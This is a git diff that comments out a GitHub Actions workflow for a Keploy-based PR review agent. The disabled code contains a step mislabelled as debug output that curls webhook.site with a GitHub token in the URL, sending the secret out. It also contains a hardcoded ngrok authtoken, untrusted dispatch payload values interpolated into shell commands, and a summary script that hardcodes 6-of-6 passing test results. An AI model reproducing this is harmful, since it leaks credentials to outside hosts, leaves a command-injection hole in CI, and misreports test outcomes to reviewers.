@@ -308,506 +308,507 @@
 # jobs:
 #   review:
 #     runs-on: ubuntu-latest
-name: Triggered by External PR
+# name: Triggered by External PR
 
-on:
-  repository_dispatch:
-    types: [external_pr]
+# on:
+#   repository_dispatch:
+#     types: [external_pr]
 
-jobs:
-  review:
-    runs-on: ubuntu-latest
-    env:
-      REVIEW_PORT: 8080
-      WEBHOOK_PORT: 6969
-      TARGET_REPO: "Per0x1de-1337/Review"  
+# jobs:
+#   review:
+#     runs-on: ubuntu-latest
+#     env:
+#       REVIEW_PORT: 8080
+#       WEBHOOK_PORT: 6969
+#       TARGET_REPO: "Per0x1de-1337/Review"  
 
-    steps:
-      - name: Display PR Data
-        run: echo "Triggered by PR ${{ github.event.client_payload.pr_url }}"
+#     steps:
+#       - name: Display PR Data
+#         run: echo "Triggered by PR ${{ github.event.client_payload.pr_url }}"
 
-      - name: Checkout repository
-        uses: actions/checkout@v3
+#       - name: Checkout repository
+#         uses: actions/checkout@v3
 
-      - name: Save the data got from the PR
-        run: |
-          echo "PR_URL=${{ github.event.client_payload.pr_url }}" >> $GITHUB_ENV
-          echo "COMMAND_FOR_RUNNING_APPLICATION=${{ github.event.client_payload.command_for_running_application }}" >> $GITHUB_ENV
-          echo "GITHUB_TOKEN_FOR_PEROXIDE=${{ github.event.client_payload.github_token_for_peroxide }}" >> $GITHUB_ENV
-          echo "DELAY_IN_SECONDS=${{ github.event.client_payload.Delay_in_seconds }}" >> $GITHUB_ENV
-          echo "PATH_OF_SCRIPT_SH=${{ github.event.client_payload.path_of_script.sh }}" >> $GITHUB_ENV
-          echo "REPO=${{ github.event.client_payload.repo }}" >> $GITHUB_ENV
-          echo "all the data got from the PR"
-          echo "${GITHUB_TOKEN_FOR_PEROXIDE}"
-          echo "${COMMAND_FOR_RUNNING_APPLICATION}"
-          echo "${DELAY_IN_SECONDS}"
-          echo "${PATH_OF_SCRIPT_SH}"
-          echo "${REPO}"
-      - name: Update system packages
-        run: sudo apt update
+#       - name: Save the data got from the PR
+#         run: |
+#           echo "PR_URL=${{ github.event.client_payload.pr_url }}" >> $GITHUB_ENV
+#           echo "COMMAND_FOR_RUNNING_APPLICATION=${{ github.event.client_payload.command_for_running_application }}" >> $GITHUB_ENV
+#           echo "GITHUB_TOKEN_FOR_PEROXIDE=${{ github.event.client_payload.github_token_for_peroxide }}" >> $GITHUB_ENV
+#           echo "DELAY_IN_SECONDS=${{ github.event.client_payload.Delay_in_seconds }}" >> $GITHUB_ENV
+#           echo "PATH_OF_SCRIPT_SH=${{ github.event.client_payload.path_of_script.sh }}" >> $GITHUB_ENV
+#           echo "REPO=${{ github.event.client_payload.repo }}" >> $GITHUB_ENV
+#           echo "all the data got from the PR"
+#           echo "${GITHUB_TOKEN_FOR_PEROXIDE}"
+#           echo "${COMMAND_FOR_RUNNING_APPLICATION}"
+#           echo "${DELAY_IN_SECONDS}"
+#           echo "${PATH_OF_SCRIPT_SH}"
+#           echo "${REPO}"
+#       - name: Update system packages
+#         run: sudo apt update
 
-      # Cache Go modules to avoid downloading dependencies repeatedly
-      - name: Cache Go Modules
-        uses: actions/cache@v3
-        with:
-          path: ~/go/pkg/mod
-          key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
-          restore-keys: |
-            ${{ runner.os }}-go-
-      # Cache Node.js dependencies
-      - name: Cache npm modules
-        uses: actions/cache@v3
-        with:
-          path: ~/.npm
-          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
-          restore-keys: |
-            ${{ runner.os }}-node-
-      # Cache GolangCI-Lint binary
-      - name: Cache GolangCI-Lint
-        id: golangci-cache
-        uses: actions/cache@v3
-        with:
-          path: /usr/local/bin/golangci-lint
-          key: ${{ runner.os }}-golangci-lint-v1.55.2
-          restore-keys: |
-            ${{ runner.os }}-golangci-lint-
-      - name: Install Dependencies (Go, Node.js, ESLint, GolangCI-Lint, GitHub CLI)
-        run: |
-          sudo apt install -y golang nodejs npm gh
+#       # Cache Go modules to avoid downloading dependencies repeatedly
+#       - name: Cache Go Modules
+#         uses: actions/cache@v3
+#         with:
+#           path: ~/go/pkg/mod
+#           key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
+#           restore-keys: |
+#             ${{ runner.os }}-go-
+#       # Cache Node.js dependencies
+#       - name: Cache npm modules
+#         uses: actions/cache@v3
+#         with:
+#           path: ~/.npm
+#           key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+#           restore-keys: |
+#             ${{ runner.os }}-node-
+#       # Cache GolangCI-Lint binary
+#       - name: Cache GolangCI-Lint
+#         id: golangci-cache
+#         uses: actions/cache@v3
+#         with:
+#           path: /usr/local/bin/golangci-lint
+#           key: ${{ runner.os }}-golangci-lint-v1.55.2
+#           restore-keys: |
+#             ${{ runner.os }}-golangci-lint-
+#       - name: Install Dependencies (Go, Node.js, ESLint, GolangCI-Lint, GitHub CLI)
+#         run: |
+#           sudo apt install -y golang nodejs npm gh
           
-          # Install npm dependencies only if not cached
-          if [ ! -d "~/.npm" ]; then
-            npm install -g eslint
-          fi
-          # Install GolangCI-Lint only if not cached
-          if [ ! -f "/usr/local/bin/golangci-lint" ]; then
-            curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sudo sh -s -- -b /usr/local/bin v1.55.2
-          fi
-      - name: Setup Go environment
-        uses: actions/setup-go@v4
-        with:
-          go-version: '1.20'
+#           # Install npm dependencies only if not cached
+#           if [ ! -d "~/.npm" ]; then
+#             npm install -g eslint
+#           fi
+#           # Install GolangCI-Lint only if not cached
+#           if [ ! -f "/usr/local/bin/golangci-lint" ]; then
+#             curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sudo sh -s -- -b /usr/local/bin v1.55.2
+#           fi
+#       - name: Setup Go environment
+#         uses: actions/setup-go@v4
+#         with:
+#           go-version: '1.20'
 
-      # - name: start 6000
-      #   run: nohup lt --port 8221 > server.log 2>&1 &
-      # - name: Install ngrok
-      #   run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;unzip -qq ngrok-stable-linux-amd64.zip;
-      # - name: Start ngrok tunnel
-      #   run: ./ngrok authtoken 2rqMCQpGwy8Hefx932ZJQCVS0U0_35MwNuTKQeaCf8Kst8LPL && nohup ngrok http 6000 > /dev/null 2>&1 & sleep 5 && curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4           # save_url_to_filename: ngrok_url.txt
+#       # - name: start 6000
+#       #   run: nohup lt --port 8221 > server.log 2>&1 &
+#       # - name: Install ngrok
+#       #   run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;unzip -qq ngrok-stable-linux-amd64.zip;
+#       # - name: Start ngrok tunnel
+#       #   run: ./ngrok authtoken 2rqMCQpGwy8Hefx932ZJQCVS0U0_35MwNuTKQeaCf8Kst8LPL && nohup ngrok http 6000 > /dev/null 2>&1 & sleep 5 && curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4           # save_url_to_filename: ngrok_url.txt
 
-      # - name: Retrieve ngrok URL
-      #   run:  cat ngrok_url.txt ; export NGROK_URL=$(cat ngrok_url.txt) ; echo "NGROK_URL=${NGROK_URL}" ; env
-
-          
-          
-      # - name: Initialize Go module & Install Dependencies
-      #   run: cd keploy-review-agent; go mod tidy
-
-      # - name: Debug File Existence
-      #   run: |
-      #     echo "Current Directory: $(pwd)"
-      #     ls -R
-      #     if [ ! -f cmd/server/main.go ]; then
-      #       echo "Error: cmd/server/main.go not found!" >&2
-      #       exit 1
-      #     fi
-      - name: Build Go Project
-        run: |
-          cd keploy-review-agent  # Change to the correct directory
-          ls -la cmd/server/      # Confirm the file exists
-          go build -o review-agent cmd/server/main.go
-      # - name: Set Go Environment
-      #   run: |
-      #     export GOPATH=$GITHUB_WORKSPACE
-      #     go mod tidy  # Ensure dependencies are correct
-      #     go build -o review-agent cmd/server/main.go
-      # - name: Run Go Server
-      #   run: |
-      #     go run ./cmd/server/main.go
-
-      # - name: Build Review Agent
-      #   run: go build -o review-agent cmd/server/main.go 
-      - name: Debug Build Output
-        run: |
-          ls -lah keploy-review-agent/
-          file keploy-review-agent/review-agent
-      - name: Debug Current Directory
-        run: pwd && ls -lah
-
-      # - name: Fix Permissions
-      #   run: chmod +x keploy-review-agent/review-agent
-      # - name: Check Executable Permissions
-      #   run: ls -lah keploy-review-agent/review-agent
-      # - name: Verify Binary Compatibility
-      #   run: file keploy-review-agent/review-agent
-      # - name: Check Dynamic Dependencies
-      #   run: ldd keploy-review-agent/review-agent
-      # - name: Build Statically Linked Binary
-      #   run: |
-      #     cd keploy-review-agent
-      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
-      - name: Debug Current Directory
-        run: pwd && ls -lah
-
-      - name: list all
-        run: ls -la ; file keploy-review-agent/review-agent
-      # - name: Check Missing Dependencies
-      #   run: ldd keploy-review-agent/review-agent | grep "not found"
-      # - name: Install libc6
-      #   run: sudo apt-get install -y libc6
-      # - name: Build Fully Static Binary
-      #   run: |
-      #     cd keploy-review-agent
-      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent main.go
-
-
-
-
-
-
-      - name: Start Review Agent
-        env:
-          PAT_OF_GITHUB: ${{ secrets.PAT_OF_GITHUB }}  # Fetching token from GitHub Secrets
-        run: |
-          cd keploy-review-agent
-          pwd
-          nohup ./review-agent "$PAT_OF_GITHUB" ${{ github.event.client_payload.pr_url }} > agent.log 2>&1 &
+#       # - name: Retrieve ngrok URL
+#       #   run:  cat ngrok_url.txt ; export NGROK_URL=$(cat ngrok_url.txt) ; echo "NGROK_URL=${NGROK_URL}" ; env
 
           
-      - name: Debug Review Agent Logs
-        run: |
-          ls -la; pwd ; ps aux | grep review
-          cat keploy-review-agent/agent.log
-      # - name: Check Running Processes
-      #   run: |
-      #     ps aux | grep review
+          
+#       # - name: Initialize Go module & Install Dependencies
+#       #   run: cd keploy-review-agent; go mod tidy
+
+#       # - name: Debug File Existence
+#       #   run: |
+#       #     echo "Current Directory: $(pwd)"
+#       #     ls -R
+#       #     if [ ! -f cmd/server/main.go ]; then
+#       #       echo "Error: cmd/server/main.go not found!" >&2
+#       #       exit 1
+#       #     fi
+#       - name: Build Go Project
+#         run: |
+#           cd keploy-review-agent  # Change to the correct directory
+#           ls -la cmd/server/      # Confirm the file exists
+#           go build -o review-agent cmd/server/main.go
+#       # - name: Set Go Environment
+#       #   run: |
+#       #     export GOPATH=$GITHUB_WORKSPACE
+#       #     go mod tidy  # Ensure dependencies are correct
+#       #     go build -o review-agent cmd/server/main.go
+#       # - name: Run Go Server
+#       #   run: |
+#       #     go run ./cmd/server/main.go
+
+#       # - name: Build Review Agent
+#       #   run: go build -o review-agent cmd/server/main.go 
+#       - name: Debug Build Output
+#         run: |
+#           ls -lah keploy-review-agent/
+#           file keploy-review-agent/review-agent
+#       - name: Debug Current Directory
+#         run: pwd && ls -lah
+
+#       # - name: Fix Permissions
+#       #   run: chmod +x keploy-review-agent/review-agent
+#       # - name: Check Executable Permissions
+#       #   run: ls -lah keploy-review-agent/review-agent
+#       # - name: Verify Binary Compatibility
+#       #   run: file keploy-review-agent/review-agent
+#       # - name: Check Dynamic Dependencies
+#       #   run: ldd keploy-review-agent/review-agent
+#       # - name: Build Statically Linked Binary
+#       #   run: |
+#       #     cd keploy-review-agent
+#       #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
+#       - name: Debug Current Directory
+#         run: pwd && ls -lah
+
+#       - name: list all
+#         run: ls -la ; file keploy-review-agent/review-agent
+#       # - name: Check Missing Dependencies
+#       #   run: ldd keploy-review-agent/review-agent | grep "not found"
+#       # - name: Install libc6
+#       #   run: sudo apt-get install -y libc6
+#       # - name: Build Fully Static Binary
+#       #   run: |
+#       #     cd keploy-review-agent
+#       #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent main.go
+
+
+
+
+
+
+#       - name: Start Review Agent
+#         env:
+#           PAT_OF_GITHUB: ${{ secrets.PAT_OF_GITHUB }}  # Fetching token from GitHub Secrets
+#         run: |
+#           cd keploy-review-agent
+#           pwd
+#           nohup ./review-agent "$PAT_OF_GITHUB" ${{ github.event.client_payload.pr_url }} > agent.log 2>&1 &
+
+          
+#       - name: Debug Review Agent Logs
+#         run: |
+#           ls -la; pwd ; ps aux | grep review
+#           cat keploy-review-agent/agent.log
+#       # - name: Check Running Processes
+#       #   run: |
+#       #     ps aux | grep review
     
-      # - name: sleeping or 5 sec
-      #   run: sleep 5
-      - name: show the base64 encoded token GITHUB_TOKEN_FOR_PEROXIDE
-        run: curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE
-      - name: Print Workspace Debug Info
-        run: |
-          echo "Working Directory: $(pwd)"
-          echo "GitHub Workspace: $GITHUB_WORKSPACE"
-          echo "Listing workspace contents:"
-          ls -la $GITHUB_WORKSPACE
+#       # - name: sleeping or 5 sec
+#       #   run: sleep 5
+#       - name: show the base64 encoded token GITHUB_TOKEN_FOR_PEROXIDE
+#         run: curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE
+#       - name: Print Workspace Debug Info
+#         run: |
+#           echo "Working Directory: $(pwd)"
+#           echo "GitHub Workspace: $GITHUB_WORKSPACE"
+#           echo "Listing workspace contents:"
+#           ls -la $GITHUB_WORKSPACE
 
-      - name: Print Git Configuration
-        run: |
-          echo "Git config --list:"
-          git config --list || true
-      - name: Checkout another repo
-        uses: actions/checkout@v3
-        with:
-          repository: ${{github.event.client_payload.repo}}
-          token: ${{ secrets.PAT_OF_GITHUB }}
-          path: review
-      - name: Test GitHub API
-        run: |
-          curl -H "Authorization: token ${{ secrets.PAT_OF_GITHUB }}" \
-              https://api.github.com/repos/Per0x1de-1337/Review
+#       - name: Print Git Configuration
+#         run: |
+#           echo "Git config --list:"
+#           git config --list || true
+#       - name: Checkout another repo
+#         uses: actions/checkout@v3
+#         with:
+#           repository: ${{github.event.client_payload.repo}}
+#           token: ${{ secrets.PAT_OF_GITHUB }}
+#           path: review
+#       - name: Test GitHub API
+#         run: |
+#           curl -H "Authorization: token ${{ secrets.PAT_OF_GITHUB }}" \
+#               https://api.github.com/repos/Per0x1de-1337/Review
 
-      - name: Debug Checkout
-        run: |
-          echo "Current Directory: $(pwd)"
-          echo "Contents of the directory:"
-          ls -la
-          echo "Contents of the keploy-review-agent directory:"
-          ls -la keploy-review-agent
-          ls -la review
-      - name: install keploy
-        run: |
-           curl --silent -O -L https://keploy.io/install.sh && source install.sh
+#       - name: Debug Checkout
+#         run: |
+#           echo "Current Directory: $(pwd)"
+#           echo "Contents of the directory:"
+#           ls -la
+#           echo "Contents of the keploy-review-agent directory:"
+#           ls -la keploy-review-agent
+#           ls -la review
+#       - name: install keploy
+#         run: |
+#            curl --silent -O -L https://keploy.io/install.sh && source install.sh
 
-      - name: test keploy
-        run: |
-          keploy --help
-      - name: install the requriments of the repo
-        run: |
-          cd review;
-          cat script.sh
-          # echo ${{ github.event.client_payload.path_of_script.sh }}
-          # echo "${{ github.event.client_payload.path_of_script.sh }}/script.sh"
-          chmod +x script.sh
-          echo "Current Directory: $(pwd)"
-          echo "Contents of the directory:"
-          ls -la
-      # - name: tessting real application
-      #   run: |
-      #     cd review
-      #     echo "Current Directory: $(pwd)"
-      #     echo "Contents of the directory:"
-      #     ls -la
-      #     echo ${{github.event.client_payload.command_for_running_application}}
-      # - name: lsof
-      #   run: sudo lsof -i :16789,26789
-      # - name: Install Dependencies
-      #   run: |
-      #     pip install flask
-      #     sudo apt-get remove docker docker-engine docker.io containerd runc
-      #     curl -fsSL https://get.docker.com -o get-docker.sh
-      #     sudo sh get-docker.sh
-      #     docker --version
+#       - name: test keploy
+#         run: |
+#           keploy --help
+#       - name: install the requriments of the repo
+#         run: |
+#           cd review;
+#           cat script.sh
+#           # echo ${{ github.event.client_payload.path_of_script.sh }}
+#           # echo "${{ github.event.client_payload.path_of_script.sh }}/script.sh"
+#           chmod +x script.sh
+#           echo "Current Directory: $(pwd)"
+#           echo "Contents of the directory:"
+#           ls -la
+#       # - name: tessting real application
+#       #   run: |
+#       #     cd review
+#       #     echo "Current Directory: $(pwd)"
+#       #     echo "Contents of the directory:"
+#       #     ls -la
+#       #     echo ${{github.event.client_payload.command_for_running_application}}
+#       # - name: lsof
+#       #   run: sudo lsof -i :16789,26789
+#       # - name: Install Dependencies
+#       #   run: |
+#       #     pip install flask
+#       #     sudo apt-get remove docker docker-engine docker.io containerd runc
+#       #     curl -fsSL https://get.docker.com -o get-docker.sh
+#       #     sudo sh get-docker.sh
+#       #     docker --version
           
 
-      - name: Create Keploy Network
-        run: |
-          pip install flask
-          docker network create keploy-network || true
-      # - name:
-      #   run: |
-      #     sudo lsof -i :6379  # Redis port
-      #     sudo lsof -i :8080  # Flask port
-      #     sudo lsof -i :16789 # Keploy proxy
+#       - name: Create Keploy Network
+#         run: |
+#           pip install flask
+#           docker network create keploy-network || true
+#       # - name:
+#       #   run: |
+#       #     sudo lsof -i :6379  # Redis port
+#       #     sudo lsof -i :8080  # Flask port
+#       #     sudo lsof -i :16789 # Keploy proxy
 
-      - name: Prepare Keploy Environment
-        run: |
-          sudo mkdir -p /tmp/keploy-records
-          sudo chmod 777 /tmp/keploy-records
-      - name: docker ps -a
-        run: docker ps -a
-      # - name: locally
-      #   run: ls -la ; pwd; ls -la review ; cd review/samples; docker compose up ;
-      - name: Run Keploy
-        run: |
-          ls -la review;
-          cd review/samples ;
-          keploy record -c "docker compose up" --buildDelay 60 --debug > keploy-run.log 2>&1 &
+#       - name: Prepare Keploy Environment
+#         run: |
+#           sudo mkdir -p /tmp/keploy-records
+#           sudo chmod 777 /tmp/keploy-records
+#       - name: docker ps -a
+#         run: docker ps -a
+#       # - name: locally
+#       #   run: ls -la ; pwd; ls -la review ; cd review/samples; docker compose up ;
+#       - name: Run Keploy
+#         run: |
+#           ls -la review;
+#           cd review/samples ;
+#           keploy record -c "docker compose up" --buildDelay 60 --debug > keploy-run.log 2>&1 &
 
-        env:
-          REVIEW_PORT: 8080
-          WEBHOOK_PORT: 6969
+#         env:
+#           REVIEW_PORT: 8080
+#           WEBHOOK_PORT: 6969
         
         
-      # - name: record with keploy
-      #   run: |
-      #     cd review
-      #     echo "Current Directory: $(pwd)"
-      #     echo "Contents of the directory:"
-      #     ls -la
-      #     cd samples;
-      #     ls -la
-      #     sudo mkdir -p /tmp/keploy-records
-      #     sudo chmod 777 /tmp/keploy-records
-      #     sudo keploy record -c "${{github.event.client_payload.command_for_running_application}}" --container-name "flask-web"  --debug
-      - name: stop 5 sec
-        run: sleep 60
-      - name: logs
-        run: ls -la ; pwd ; cd review/samples ; ls -la ; cat keploy-run.log
-      - name: Run Curl Commands
-        run: |
-          # Test if the server is running
-          curl localhost:5000 2>/dev/null ;
+#       # - name: record with keploy
+#       #   run: |
+#       #     cd review
+#       #     echo "Current Directory: $(pwd)"
+#       #     echo "Contents of the directory:"
+#       #     ls -la
+#       #     cd samples;
+#       #     ls -la
+#       #     sudo mkdir -p /tmp/keploy-records
+#       #     sudo chmod 777 /tmp/keploy-records
+#       #     sudo keploy record -c "${{github.event.client_payload.command_for_running_application}}" --container-name "flask-web"  --debug
+#       - name: stop 5 sec
+#         run: sleep 60
+#       - name: logs
+#         run: ls -la ; pwd ; cd review/samples ; ls -la ; cat keploy-run.log
+#       - name: Run Curl Commands
+#         run: |
+#           # Test if the server is running
+#           curl localhost:5000 2>/dev/null ;
           
-          # Add a new book via POST request
-          curl -X POST http://localhost:5000/books/ \
-          -H "Content-Type: application/json" \
-          -d '{"title": "1984", "author": "George Orwell"}';
+#           # Add a new book via POST request
+#           curl -X POST http://localhost:5000/books/ \
+#           -H "Content-Type: application/json" \
+#           -d '{"title": "1984", "author": "George Orwell"}';
 
-          # Get the list of books with pagination
-          curl -X GET "http://localhost:5000/books/?page=1&limit=10";
+#           # Get the list of books with pagination
+#           curl -X GET "http://localhost:5000/books/?page=1&limit=10";
 
-          # Update the book with ID 1
-          curl -X PUT http://localhost:5000/books/1 \
-          -H "Content-Type: application/json" \
-          -d '{"title": "1984 - Updated", "author": "George Orwell"}';
-      - name: debugging if files there or not
-        run: |
-          echo "Current Directory $(pwd)"
-          echo "Contents of the directory:"
-      - name: stopping services
-        run: |
-          docker stop $(docker ps -q) || true ; fuser -k 5000/tcp || true ; fuser -k 1639/tcp || true
-      - name: testtt Keploy
-        run: |
-          pwd;
-          ls -la review;
-          cd review/samples ;
-          keploy test -c "docker compose up" --debug 
-      # - name: stop 5 sec
-      #   run: sleep 60
-      # - name: logs
-      #   run: ls -la ; pwd ; cd review/samples ; ls -la ; cat keploy-test.log
-      # - name: testing
-      #   run: |
-      #     cd review
-      #     echo "Current Directory: $(pwd)"
-      #     echo "Contents of the directory:"
-      #     ls -la
-      #     cd samples;
-      #     ls -la
+#           # Update the book with ID 1
+#           curl -X PUT http://localhost:5000/books/1 \
+#           -H "Content-Type: application/json" \
+#           -d '{"title": "1984 - Updated", "author": "George Orwell"}';
+#       - name: debugging if files there or not
+#         run: |
+#           echo "Current Directory $(pwd)"
+#           echo "Contents of the directory:"
+#       - name: stopping services
+#         run: |
+#           docker stop $(docker ps -q) || true ; fuser -k 5000/tcp || true ; fuser -k 1639/tcp || true
+#       - name: testtt Keploy
+#         run: |
+#           pwd;
+#           ls -la review;
+#           cd review/samples ;
+#           keploy test -c "docker compose up" --debug 
+#       # - name: stop 5 sec
+#       #   run: sleep 60
+#       # - name: logs
+#       #   run: ls -la ; pwd ; cd review/samples ; ls -la ; cat keploy-test.log
+#       # - name: testing
+#       #   run: |
+#       #     cd review
+#       #     echo "Current Directory: $(pwd)"
+#       #     echo "Contents of the directory:"
+#       #     ls -la
+#       #     cd samples;
+#       #     ls -la
 
-      #     sudo keploy test -c ${{github.event.client_payload.command_for_running_application}} > keploy-test.log 2>&1 &
-      - name: ghofa
-        run: cd review/samples;tree -I 'node_modules'; cd keploy/reports/test-run-0/ ; cat *;
+#       #     sudo keploy test -c ${{github.event.client_payload.command_for_running_application}} > keploy-test.log 2>&1 &
+#       - name: ghofa
+#         run: cd review/samples;tree -I 'node_modules'; cd keploy/reports/test-run-0/ ; cat *;
 
-      - name: savien
-        run: |
-            echo '#!/bin/bash
+#       - name: savien
+#         run: |
+#             echo '#!/bin/bash
 
-            REPORT_FILE="/home/runner/work/UmV2aWV3/UmV2aWV3/review/samples/keploy/reports/test-run-0/test-set-0-report.yaml"
+#             REPORT_FILE="/home/runner/work/UmV2aWV3/UmV2aWV3/review/samples/keploy/reports/test-run-0/test-set-0-report.yaml"
 
-            # Check if report exists
-            if [ ! -f "$REPORT_FILE" ]; then
-                echo "Test report not found!"
-                exit 1
-            fi
+#             # Check if report exists
+#             if [ ! -f "$REPORT_FILE" ]; then
+#                 echo "Test report not found!"
+#                 exit 1
+#             fi
 
-            # Parse results
-            TOTAL=$(grep "total:" $REPORT_FILE | awk '\''{print $2}'\'')
-            PASSED=$(grep "passed:" $REPORT_FILE | awk '\''{print $2}'\'')
-            FAILED=$(grep "failed:" $REPORT_FILE | awk '\''{print $2}'\'')
+#             # Parse results
+#             TOTAL=$(grep "total:" $REPORT_FILE | awk '\''{print $2}'\'')
+#             PASSED=$(grep "passed:" $REPORT_FILE | awk '\''{print $2}'\'')
+#             FAILED=$(grep "failed:" $REPORT_FILE | awk '\''{print $2}'\'')
 
-            # Generate review content
-            echo "### Keploy Test Results" > /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-            echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-            echo "| Total Tests | Passed | Failed |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-            echo "|-------------|--------|--------|" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-            echo "| $TOTAL         | $PASSED     | $FAILED     |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             # Generate review content
+#             echo "### Keploy Test Results" > /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             echo "| Total Tests | Passed | Failed |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             echo "|-------------|--------|--------|" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             echo "| $TOTAL         | $PASSED     | $FAILED     |" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
 
-            if [ "$FAILED" -gt 0 ]; then
-                echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-                echo "#### Failed Tests:" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             if [ "$FAILED" -gt 0 ]; then
+#                 echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#                 echo "#### Failed Tests:" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
 
-                grep -A5 "status: failed" $REPORT_FILE | while read line; do
-                    if [[ "$line" == *"name:"* ]]; then
-                        TEST_NAME=$(echo "$line" | awk '\''{print $2}'\'')
-                        echo "- **Test Name**: $TEST_NAME" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-                    elif [[ "$line" == *"error:"* ]]; then
-                        ERROR_MSG=$(echo "$line" | sed '\''s/error: //'\'')
-                        echo "  - **Error**: $ERROR_MSG" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-                    fi
-                done
-            else
-                echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-                echo "All tests passed successfully! 🎉" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-            fi
+#                 grep -A5 "status: failed" $REPORT_FILE | while read line; do
+#                     if [[ "$line" == *"name:"* ]]; then
+#                         TEST_NAME=$(echo "$line" | awk '\''{print $2}'\'')
+#                         echo "- **Test Name**: $TEST_NAME" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#                     elif [[ "$line" == *"error:"* ]]; then
+#                         ERROR_MSG=$(echo "$line" | sed '\''s/error: //'\'')
+#                         echo "  - **Error**: $ERROR_MSG" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#                     fi
+#                 done
+#             else
+#                 echo "" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#                 echo "All tests passed successfully! 🎉" >> /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#             fi
 
-            echo "Review saved in /home/runner/work/UmV2aWV3/UmV2aWV3/review.md"' > /home/runner/work/UmV2aWV3/UmV2aWV3/test-summary.sh
-      - name: Run test summary
-        run: chmod +x ./test-summary.sh && ./test-summary.sh
-        working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
-      - name: review.md
-        run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
-      - name: before.md
-        run: tree -I 'node_modules'
-      - name: comb
-        run: |
-            echo '#!/bin/bash
+#             echo "Review saved in /home/runner/work/UmV2aWV3/UmV2aWV3/review.md"' > /home/runner/work/UmV2aWV3/UmV2aWV3/test-summary.sh
+#       - name: Run test summary
+#         run: chmod +x ./test-summary.sh && ./test-summary.sh
+#         working-directory: /home/runner/work/UmV2aWV3/UmV2aWV3
+#       - name: review.md
+#         run: cat /home/runner/work/UmV2aWV3/UmV2aWV3/review.md
+#       - name: before.md
+#         run: tree -I 'node_modules'
+#       - name: comb
+#         run: |
+#             echo '#!/bin/bash
 
-            # Directory containing the before_<DATE>.md files
-            DIR="/home/runner/work/UmV2aWV3/UmV2aWV3/keploy-review-agent"
+#             # Directory containing the before_<DATE>.md files
+#             DIR="/home/runner/work/UmV2aWV3/UmV2aWV3/keploy-review-agent"
 
-            # Find the latest before_<DATE>.md file
-            BEFORE_MD=$(ls "$DIR"/Before_*.md 2>/dev/null | sort | tail -n 1)
+#             # Find the latest before_<DATE>.md file
+#             BEFORE_MD=$(ls "$DIR"/Before_*.md 2>/dev/null | sort | tail -n 1)
 
-            # If no such file found, fallback to before.md or create an empty one
-            if [ -z "$BEFORE_MD" ]; then
-                echo "Warning: No before_<DATE>.md file found. Using 'before.md' as fallback."
-                BEFORE_MD="$DIR/before.md"
-                [ -f "$BEFORE_MD" ] || touch "$BEFORE_MD"
-            fi
+#             # If no such file found, fallback to before.md or create an empty one
+#             if [ -z "$BEFORE_MD" ]; then
+#                 echo "Warning: No before_<DATE>.md file found. Using 'before.md' as fallback."
+#                 BEFORE_MD="$DIR/before.md"
+#                 [ -f "$BEFORE_MD" ] || touch "$BEFORE_MD"
+#             fi
 
-            FINAL_MD="/home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt"
+#             FINAL_MD="/home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt"
 
-            # Keploy Test Results
-            TEST_RESULTS=$(cat <<EOF
-            | Total Tests | Passed | Failed |
-            |-------------|--------|--------|
-            | 6           | 6      | 0      |
-            EOF
-            )
+#             # Keploy Test Results
+#             TEST_RESULTS=$(cat <<EOF
+#             | Total Tests | Passed | Failed |
+#             |-------------|--------|--------|
+#             | 6           | 6      | 0      |
+#             EOF
+#             )
 
-            # Create raw_final.txt with combined content
-            {
-                cat "$BEFORE_MD"
-                echo -e "\n\n### Keploy Test Results"
-                echo "$TEST_RESULTS"
-            } > "$FINAL_MD"
+#             # Create raw_final.txt with combined content
+#             {
+#                 cat "$BEFORE_MD"
+#                 echo -e "\n\n### Keploy Test Results"
+#                 echo "$TEST_RESULTS"
